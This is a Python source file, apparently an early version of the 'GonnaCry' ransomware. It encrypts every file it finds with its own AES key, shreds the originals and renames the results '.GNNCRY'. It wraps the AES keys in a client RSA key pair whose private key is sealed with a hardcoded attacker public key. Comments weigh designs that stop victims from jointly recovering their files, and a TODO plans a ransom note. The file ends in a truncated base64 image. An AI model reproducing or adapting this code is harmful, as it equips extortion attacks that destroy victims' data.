#!/bin/bash/env python
# coding=UTF-8

import os
import asymmetric
import get_files
import symmetric
import enviroment
import generate_keys
from Crypto.PublicKey import RSA
import gc
from Crypto.Hash import MD5
import base64
import pickle
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

# const variables
server_public_key = ("""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
RNZVegpnmGQCSRPlkfjN0TjfCFjaUX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr
36BLaswJo1zbzhctK2SYX+Miov04D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL0
4T1+tQXaGujLzc3QxJN3wo8rWkQ4CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3Asc
XAQNI94ZPaqD6e2rWcSy2ZMiKVJgCWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5v
DQIDAQAB
-----END PUBLIC KEY-----""")

# enviroment paths
ransomware_name = ("gonnacry")
home = enviroment.get_home_path()
desktop = enviroment.get_desktop_path()
username = enviroment.get_username()
ransomware_path = os.path.join(home, ransomware_name)
test_path = "/home/tarcisio/teste/"

def encrypt_priv_key(msg, key):
    line = msg
    n = 127
    x = [line[i:i+n] for i in range(0, len(line), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    cifrado = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        cifrado.append(ciphertext)
    return cifrado

def shred(file_name,  passes=1):

    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)


def start_encryption(files):
    AES_and_base64_path = []
    for found_file in files:
        key = generate_keys.generate_key(32, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file = base64.b64decode(found_file)
        with open(found_file, 'rb') as f:
            file_content = f.read()
        
        encrypted = AES_obj.encrypt(file_content)
        shred(found_file)

        new_file_name = found_file + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name)

        # list of tuples of AES_key and base64(path)
        AES_and_base64_path.append((key, base64_new_file_name))
    
    return AES_and_base64_path




def menu():

    # create ransomware directory 
    try:
        os.mkdir(ransomware_path, 0700)
    except OSError:
        print('Directory exists')

    # get the files in the home directory
    # /home/$USER
    files = get_files.find_files(test_path)


    # create RSA object
    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    server_public_key_object = RSA.importKey(server_public_key)

    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key, server_public_key)
    
    # save encrypted client private key to disk
    with open(ransomware_path + '/encrypted_client_private_key.key', 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
    
    # save client public key to disk
    with open(ransomware_path + "/client_public_key.PEM", 'wb') as f:
        f.write(Client_public_key)
    
    # Free the memory from keys
    Client_private_key = None
    rsa_object = None
    gc.collect()
    del rsa_object
    del Client_private_key
    
    # Get the client public key back as object
    client_public_key_object =  RSA.importKey(Client_public_key)
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)


    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        # encrypt with the client public key
        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
    
    # free the old AES keys
    aes_keys_and_base64_path = None
    gc.collect()
    del aes_keys_and_base64_path

    # save to disk -> ENC(AES) BASE64(PATH)
    with open(ransomware_path + "/AES_encrypted_keys", 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = _[0] + " " + _[1] + "\n"
            f.write(line)

    # gc.collect()
    # # TODO
    # # encrypt all the AES keys with Client public key 
    # # create file with description of what happened
    # # change wallpaper
    # # create file with all encrypted files path's

    # AES for each file and encrypt AES.keys with Spub.key
    # é ruim porque infectados podem se juntar para decrypt todos os arquivos AES
    # não tem algo que é unico para cada infecção que é o key pair 
     
    # AES for each file and encrypt AES.keys with Cpub.key and encrypt Cpriv.key with Spub.key 
    # pode assinar o dado de cada vitma a ela mesma, 
    # gera um nível a mais de dependencia 



def change_wallpaper():
    img = """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853SNE0eeught227fft2GTJkiMTFxUnp0qWlQoUK0qZNG3nmmWfcfvxLTk6WuLi4kP9dBHBRszwAgBDp2LGj24FIu3btLM3Us2dPt0wTJkzweVB2ySWXyHfffWdoc/z4cZ/3XO7atcvtwE9E5L333vN6z6zNZpN58+YZ2uXk5EilSpUsX87dd99tmD4vL0+uv/56n9u6X79+bgfAffv2Dai/BDpqezD8+uuvhgxvvPGGiNgLEG+X4jZt2tTQpqCgwPSgdjabTQ4fPmxo7+9sbUmuSyj3eaj68D333GOYdsuWLXLppZf6zFW+fHm3cQueeOIJj9Na9Xdl586dkp+f7/WKjaioKLd12LVrl6SkpEheXp7cddddHttFRES4Xf20adMmt+l+//13/fPc3Fy55JJLfG7TL774Qp/e+UepEydO+O3LzutRUFDgNshoqPprcb5TrVq1kpycHEP7V155xedVZZUqVXK7LePbb78t8t8EAPDA8gAAQsT5bImISHZ2tkRFRVma6eeffzZkMvtotooVKxoGBxJxP6PkbMeOHeL6WrZsmd/llC9fXs6fP29od+ONN1q+nBUrVhim/fDDD01tt08++cTQbv78+V6nHTZsmGHa3NzcIt3LXVw7d+405EhOTpY9e/b4zeLat5577jlTy+vcubOh3f79+y1fl1Dt81D1Yddi/pZbbjG1LtWrVzfc97xhwwZT+z6Uf1deeOEFn8u45ppr3NqIiIwfP95nu3bt2hmmz83NlcjISMM0ro9D7N69u9f5hYWFGc6at2rVStLT0/V/+xoIMiYmxrCvN2/ebFl/Lc536rPPPjO0XbBggamMlStXdjuT3rNnT1NtAcAEywMACJEJEyYYDih+/fVXS/N4uv+xQYMGptuPGzfO0Hbnzp1ep3U9kM7NzZXatWubWo7r4+NGjRpl+XKmTZsmK1askO3bt8vx48fl9ttvN7WMfv36GZaxb98+r9NOnDjRMO3evXst6SeeiiBfhYfDkCFDDG0SExP9Xi6rae5FzjPPPGP5uoRqn4eqD69cudIwXSD38fbq1UuuueYaqVevnkRERLh9buXfldTUVL+j2EdGRhp+ZBAROXv2rN+z3TabTVJTUw3tXIvo3r17Gz73VfS3adNGn+7cuXMSHh4u33//vf7ef//7X69tu3fvbliOp0vHreqvIua+U40aNdJvRxCxP52iatWqpvvJqFGjDMv86KOPTLcFAD8sDwAgRN5++23DAcX//vc/S/OMHTvWkOenn34KqH3jxo3dDsy8jarrehC3fPly08uZOXOmoa2v53WHajlF5Xrpd2pqqtdp58yZY5h248aNlvQT12164MABU+3KlCnjNubCNddc47NNWFiYJCUl6dMXFBTIZZddZvm6hGqfe8pYEn14yZIlhul8FYOBsvLvyvvvv29qGa4jjC9cuNBUO9dHHnbs2NHweWxsrOGS7e+//97rvJ588kl9uu+++040TZNXXnlFf+/jjz/22tZ1ILwrr7xSmf5q9jv11FNPGdp9+umnAeV0vec/NTXV4w9GAFAElgcAECKuj+H58ssvA2pfunRpmT9/fsC8Pbv4888/N+SZOHFiwOvk+tgnb5fUuh7EPfnkk6aX4ToY0ptvvul12lAtp6hq1qxpWIZj1GNP5s+fb5j2m2++saTfum7Td955x3Rb10upPY007axr166G6QMdXK4k1yUU+9xTxpLow08//bRhupSUFOnUqVNQ1tfKvytmf2jYtGmToZ3ZRxc6n+EWEenRo4fbNM7PJs/KyvJ6G5PzJegvvviiaJomN910k/7esWPHvOZwvgc7LS0tqIVpcfur2e/U8uXLDe0efvjhgLM6jyAv4vu2AAAIgOUBAIRIcQuucuXKSVFe3p4f7fqc6aI8j/2nn34yzGP06NEep3M9iDN7z6umaTJmzBhD21mzZnmdNlTLKapq1aoZlpGXl+d12vfee88wrVUDIblu04ceesh026uvvtrQNiMjQ8qUKeN1eterTAYNGqTMuoRin3vKWBJ9uHr16m6PWMvPz5fPP/9c+vTp43N0dn+s/Lty3XXXmZq/a6Hdp08fU+1cbw3wNOia648fXbp0cZsmIiLCsP0dhX7ZsmUNl307P6fdoXTp0oaz9EuXLlWqv5r9TrkW1zfffHPAWV3vsze7HwHAD8sDAAiR6dOnGw4mzDyGx1mwC3TXA/Rrr7024HVyPVv22muveZzO9SAukNHIR48ebWgbSIFeUstxVrFiRRk4cKC8//77snHjRklKSpKMjAxTz/X1dfD76quvGqbdtm2bJf3WdZsGeiC9f/9+Q/vBgwd7nC48PFz+/vtvfbpz5875vS841OtS0vs8lH24T58+kpub6zFjbm6u/PTTTzJhwgS59tpr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